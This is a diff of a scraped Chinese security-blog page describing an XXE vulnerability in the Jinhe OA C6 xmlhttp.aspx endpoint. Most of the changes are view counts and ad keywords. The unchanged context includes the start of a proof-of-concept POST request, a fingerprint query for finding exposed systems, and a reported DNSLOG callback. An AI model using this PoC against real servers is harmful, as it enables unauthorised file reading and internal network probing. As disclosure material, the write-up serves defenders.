@@ -7,23 +7,25 @@ asset_dir: assets/金和oa-jhsoft.web.h5sitecontrolxmlhttp.aspx-xxe漏洞
 # 金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2026/1/30 13:31
-- 187浏览
+- 188浏览
 - [0评论](#comment)
 - 8分钟阅读
 
 深入探索
 
-恶意软件分析工具
+传输层安全性协议
 
-安全研究工具
+安全运维咨询
 
-SQL注入防护
+Nessus
 
 ---
 
 # 漏洞简介
 
 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.H5SiteControl/xmlhttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。
+
+漏洞扫描服务
 
 # 影响版本
 
@@ -34,6 +36,14 @@ SQL注入防护
 > app="金和网络-金和OA"
 
 # 漏洞分析
+
+深入探索
+
+数据库
+
+文本剥离工具
+
+软件
 
 直接根据 `JHSoft.Web.H5SiteControl/xmlhttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Groups.dll` 将其进行反编译后找到 **xmlhttp** 的处理逻辑
 
@@ -48,14 +58,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-文件大小转换
-
-Nessus
-
-服务器安全服务
-
 ```
 POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -68,6 +70,8 @@ Host: jhsoft.mrxn.net
 ```
 
 在DNSLOG平台成功收到请求
+
+网络安全
 
 [![金和OA JHSoft.Web.H5SiteControl/xmlhttp.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)
 
